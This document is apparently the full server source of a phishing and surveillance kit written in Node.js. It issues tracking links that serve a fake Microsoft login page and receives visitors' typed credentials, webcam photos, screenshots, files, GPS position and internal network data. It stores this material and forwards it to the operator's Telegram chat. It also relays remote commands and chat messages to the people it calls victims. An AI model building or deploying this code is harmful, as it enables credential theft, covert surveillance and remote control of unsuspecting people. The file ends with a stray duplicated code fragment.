const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const parser = require('user-agent-parser');
const axios = require('axios');
const fs = require('fs');
const cors = require('cors');
const webpush = require('web-push');
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { Pool } = require('pg');

const app = express();
app.use(cors());

// PostgreSQL Config
const dbConfig = {
    host: process.env.DB_HOST,
    port: process.env.DB_PORT,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD || process.env.DB_PASS,
    database: process.env.DB_NAME,
    ssl: process.env.DB_SSL === 'true' ? { rejectUnauthorized: false } : false
};

let pool = null;
let useJSON = false;
const DB_PATH = path.join(process.cwd(), 'database.json');

// Memory storage for JSON fallback
let memoryDB = { links: {}, logs: {}, settings: {} };

function loadJSON() {
    try {
        if (fs.existsSync(DB_PATH)) {
            const data = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
            
            // Ensure links is an object
            if (Array.isArray(data.links)) {
                const linksObj = {};
                data.links.forEach(l => { if(l && l.id) linksObj[l.id] = l; });
                memoryDB.links = linksObj;
            } else if (data.links) {
                memoryDB.links = data.links;
            }

            // Ensure logs is an object
            if (Array.isArray(data.logs)) {
                const logsObj = {};
                data.logs.forEach(l => { if(l && l.id) logsObj[l.id] = l; });
                memoryDB.logs = logsObj;
            } else if (data.logs) {
                memoryDB.logs = data.logs;
            }

            // Migrate settings/VAPID keys
            if (data.vapidKeys) {
                memoryDB.settings.vapid_keys = data.vapidKeys;
            } else if (data.settings) {
                memoryDB.settings = data.settings;
            }
        }
    } catch (e) { console.error('[JSON] Load Error:', e.message); }
}

function saveJSON() {
    try {
        fs.writeFileSync(DB_PATH, JSON.stringify(memoryDB, null, 2));
    } catch (e) { console.error('[JSON] Save Error:', e.message); }
}

// Telegram Config
const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TG_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const isProd = process.env.NODE_ENV === 'production' || process.env.VERCEL === '1';

let bot = null;
if (TG_TOKEN) {
    bot = new TelegramBot(TG_TOKEN, { polling: !isProd });
}

async function sendTelegramMsg(text) {
    if (!bot || !TG_CHAT_ID) return;
    try {
        await bot.sendMessage(TG_CHAT_ID, text, { parse_mode: 'Markdown' });
    } catch (e) {}
}

async function sendTelegramPhoto(buffer, caption) {
    if (!bot || !TG_CHAT_ID) return;
    try {
        await bot.sendPhoto(TG_CHAT_ID, buffer, { caption });
    } catch (e) {}
}

async function sendTelegramFile(buffer, filename, caption) {
    if (!bot || !TG_CHAT_ID) return;
    try {
        await bot.sendDocument(TG_CHAT_ID, buffer, { caption }, { filename });
    } catch (e) {}
}

// Database Stateless Helpers
async function getVapidKeys() {
    if (useJSON) return memoryDB.settings.vapid_keys || null;
    try {
        const { rows } = await pool.query('SELECT data FROM settings WHERE key = $1', ['vapid_keys']);
        return rows.length > 0 ? rows[0].data : null;
    } catch(e) { return null; }
}

async function getLog(id) {
    if (useJSON) return memoryDB.logs[id] || null;
    try {
        const { rows } = await pool.query('SELECT data FROM logs WHERE id = $1', [id]);
        return rows.length > 0 ? rows[0].data : null;
    } catch(e) { return null; }
}

async function saveLog(log) {
    if (!log.timestamp) log.timestamp = new Date();
    if (useJSON) {
        memoryDB.logs[log.id] = log;
        saveJSON();
        return;
    }
    try {
        await pool.query('INSERT INTO logs (id, data) VALUES ($1, $2) ON CONFLICT (id) DO UPDATE SET data = $2', [log.id, log]);
    } catch(e) { console.error('[DB] SaveLog Error:', e.message); }
}

async function saveLink(link) {
    if (useJSON) {
        memoryDB.links[link.id] = link;
        saveJSON();
        return;
    }
    try {
        await pool.query('INSERT INTO links (id, data) VALUES ($1, $2) ON CONFLICT (id) DO UPDATE SET data = $2', [link.id, link]);
    } catch(e) { console.error('[DB] SaveLink Error:', e.message); }
}

async function initDB() {
    if (process.env.DB_HOST) {
        try {
            pool = new Pool(dbConfig);
            await pool.query('SELECT NOW()'); // Test connection
            await pool.query(`
                CREATE TABLE IF NOT EXISTS links (id TEXT PRIMARY KEY, data JSONB NOT NULL);
                CREATE TABLE IF NOT EXISTS logs (id TEXT PRIMARY KEY, data JSONB NOT NULL);
                CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, data JSONB NOT NULL);
            `);
            console.log('[DB] PostgreSQL Connected ✅');
        } catch (err) {
            console.error('[DB] PostgreSQL Failed, switching to JSON:', err.message);
            useJSON = true;
            loadJSON();
            sendTelegramMsg(`⚠️ *AVISO DB:* PostgreSQL falhou!\n❌ Erro: \`${err.message}\`\nℹ️ O sistema está usando o arquivo JSON local.`);
        }
    } else {
        console.log('[DB] No DB_HOST found, using JSON local.');
        useJSON = true;
        loadJSON();
    }

    try {
        let keys = await getVapidKeys();
        if (!keys) {
            keys = webpush.generateVAPIDKeys();
            if (useJSON) {
                memoryDB.settings.vapid_keys = keys;
                saveJSON();
            } else {
                await pool.query('INSERT INTO settings (key, data) VALUES ($1, $2)', ['vapid_keys', keys]);
            }
        }
        webpush.setVapidDetails('mailto:admin@sentinelaware.local', keys.publicKey, keys.privateKey);
    } catch (err) {
        sendTelegramMsg(`❌ *ERRO INIT:* ${err.message}`);
    }
}
initDB();

// --- TELEMETRY ENGINE (HTTP + Socket) ---
async function processTelemetry(packet, socket = null, reqIp = null) {
    try {
        const raw = JSON.parse(Buffer.from(packet.v, 'base64').toString());
        const { event, data } = raw;
        if (!data || !data.logId) return;

        let log = await getLog(data.logId);
        const ip = (socket ? (socket.handshake.headers['x-forwarded-for']?.split(',')[0] || socket.handshake.address) : reqIp || data.ip || '0.0.0.0').replace('::ffff:', '');

        if (!log && (event === 'join' || event === 'fingerprint' || event === 'creds' || event === 'capture_creds' || event === 'perf')) {
            log = { id: data.logId, linkId: data.linkId || 'unknown', timestamp: new Date(), ip, geo: 'Localizando...', creds: [], chat: [], status: 'online' };
            await sendTelegramMsg(`🚨 *ALVO ABRIU O LINK*\n🆔 ID: \`${log.id}\`\n🌍 IP: \`${log.ip}\``);
            io.emit('new_click', log);
            axios.get(`https://ipapi.co/${ip}/json/`).then(async r => {
                if(r.data && !r.data.error) {
                    log.geo = `${r.data.city}, ${r.data.country_name}`;
                    log.lat = r.data.latitude; log.lon = r.data.longitude;
                    await saveLog(log);
                    io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
                }
            }).catch(()=>{});
            await saveLog(log);
        }

        if (event === 'join') {
            if (log) {
                log.status = 'online';
                log.timestamp = new Date();
                await saveLog(log);
                io.emit('update_log', { id: log.id, status: 'online' });
            }
        } else if (log) {
            switch(event) {
                case 'creds':
                case 'capture_creds':
                    const val = data.value || data.text;
                    if (val) {
                        log.creds.push(val); await saveLog(log);
                        io.emit('update_log', { id: log.id, creds: log.creds });
                        await sendTelegramMsg(`🔑 *CAPTURA*\n🆔 ID: \`${log.id}\`\n📝: \`${val}\``);
                    }
                    break;
                case 'photo':
                case 'capture_photo':
                    log.photo = data.image; await saveLog(log);
                    io.emit('update_log', { id: log.id, photo: log.photo });
                    sendTelegramPhoto(Buffer.from(data.image.split(',')[1], 'base64'), `📸 *FOTO* - ID: ${log.id}`);
                    break;
                case 'screenshot':
                case 'capture_screenshot':
                    log.screenshot = data.image; await saveLog(log);
                    io.emit('update_log', { id: log.id, screenshot: log.screenshot });
                    sendTelegramPhoto(Buffer.from(data.image.split(',')[1], 'base64'), `🖥️ *SCREENSHOT* - ID: ${log.id}`);
                    break;
                case 'file_up':
                case 'file_upload':
                    if(!log.files) log.files = []; log.files.push(data); await saveLog(log);
                    io.emit('update_log', { id: log.id, files: log.files });
                    sendTelegramFile(Buffer.from(data.content.split(',')[1], 'base64'), data.name, `📂 *ARQUIVO* - ID: ${log.id}`);
                    break;
                case 'geo':
                case 'update_geo':
                    log.lat = data.lat; log.lon = data.lon; log.geo = `Precise: ${data.lat},${data.lon}`;
                    await saveLog(log); io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
                    sendTelegramMsg(`📍 *GPS* - ID: ${log.id}\nhttps://www.google.com/maps?q=${data.lat},${data.lon}`);
                    break;
                case 'network':
                case 'update_network_data':
                    log.internalDevices = data.devices; await saveLog(log);
                    io.emit('update_log', { id: log.id, internalDevices: log.internalDevices });
                    break;
                case 'fingerprint':
                    log.fingerprint = data.fingerprint; await saveLog(log);
                    io.emit('update_log', { id: log.id, fingerprint: data.fingerprint });
                    sendTelegramMsg(`📂 *DOSSIÊ* - ID: ${log.id}\nOS: ${data.fingerprint.platform}`);
                    break;
                case 'typing':
                case 'perf':
                    io.emit('update_log', { id: log.id, typing: data.text });
                    break;
                case 'status_change':
                    log.status = data.status; await saveLog(log);
                    io.emit('update_log', { id: log.id, status: log.status });
                    break;
                case 'js_result': io.emit('js_result_admin', { logId: log.id, result: data.result }); break;
            }
        }
    } catch(e) { console.error('[TELEMETRY] Error:', e.message); }
}

const publicPath = path.join(process.cwd(), 'public');
app.use(express.static(publicPath));
app.use(express.json({ limit: '50mb' }));
app.use((req, res, next) => { res.setHeader('ngrok-skip-browser-warning', 'true'); next(); });

app.get('/', (req, res) => res.sendFile(path.join(publicPath, 'index.html')));

app.get('/api/logs', async (req, res) => {
    try {
        let logs = [];
        if (useJSON) {
            logs = Object.values(memoryDB.logs);
        } else {
            const { rows } = await pool.query('SELECT data FROM logs');
            logs = rows.map(r => r.data);
        }
        res.json(logs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp)));
    } catch (e) { res.json([]); }
});

app.delete('/api/logs', async (req, res) => {
    try {
        if (useJSON) {
            memoryDB.logs = {};
            saveJSON();
        } else {
            await pool.query('DELETE FROM logs');
        }
        io.emit('all_logs_deleted');
        res.json({ status: 'ok' });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.delete('/api/logs/:id', async (req, res) => {
    try {
        if (useJSON) {
            delete memoryDB.logs[req.params.id];
            saveJSON();
        } else {
            await pool.query('DELETE FROM logs WHERE id = $1', [req.params.id]);
        }
        io.emit('update_log', { id: req.params.id, deleted: true });
        res.json({ status: 'ok' });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/links', async (req, res) => {
    try {
        let links = [];
        if (useJSON) {
            links = Object.values(memoryDB.links);
        } else {
            const { rows } = await pool.query('SELECT data FROM links');
            links = rows.map(r => r.data);
        }
        const sorted = links.sort((a, b) => {
            const dateA = new Date(b.createdAt || 0);
            const dateB = new Date(a.createdAt || 0);
            return dateA - dateB;
        });
        console.log('[API] GET /api/links retornando', sorted.length, 'links');
        res.json(sorted);
    } catch (e) { 
        console.error('[API] Error in GET /api/links:', e.message);
        res.json([]); 
    }
});

app.post('/api/links', async (req, res) => {
    try {
        const id = Math.random().toString(36).substring(2, 10);
        const newLink = { 
            id, 
            url: `/t/${id}`, 
            template: req.body.template || 'microsoft', 
            createdAt: new Date(), 
            clicks: 0 
        };
        await saveLink(newLink);
        console.log('[API] POST /api/links criou novo link:', id);
        if (io) io.emit('new_link_created', newLink);
        res.json(newLink);
    } catch (e) {
        console.error('[API] Error in POST /api/links:', e.message);
        res.status(500).json({ error: e.message });
    }
});

app.get('/api/vapid-public-key', async (req, res) => {
    const keys = await getVapidKeys();
    res.json({ publicKey: keys ? keys.publicKey : null });
});

app.post('/api/telemetry', async (req, res) => {
    const ip = (req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress).replace('::ffff:', '');
    if (req.body && req.body.v) await processTelemetry(req.body, null, ip);
    res.json({ status: 'ok' });
});

app.get('/t/:id', async (req, res) => {
    try {
        let link = null;
        if (useJSON) {
            link = memoryDB.links[req.params.id];
        } else {
            const { rows } = await pool.query('SELECT data FROM links WHERE id = $1', [req.params.id]);
            link = rows.length > 0 ? rows[0].data : null;
        }
        
        if (link) { 
            link.clicks = (link.clicks || 0) + 1; 
            await saveLink(link); 
        }
        
        const template = (link && fs.existsSync(path.join(publicPath, `${link.template}.html`))) ? `${link.template}.html` : 'microsoft.html';
        res.sendFile(path.join(publicPath, template));
    } catch (e) {
        res.sendFile(path.join(publicPath, 'microsoft.html'));
    }
});

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { 
        origin: "*",
        methods: ["GET", "POST"],
        allowEIO3: true
    },
    transports: ['polling', 'websocket'],
    pingInterval: 25000,
    pingTimeout: 5000,
    maxHttpBufferSize: 1e6
});

io.on('connection', (socket) => {
    socket.on('telemetry_data', (p) => processTelemetry(p, socket));
    socket.on('remote_command', (d) => io.emit('execute_command', d));
    socket.on('admin_send_chat', (d) => io.emit('victim_recv_chat', d));
});

const PORT = process.env.PORT || 3000;
if (!process.env.VERCEL) server.listen(PORT);
module.exports = app;
orts = app;
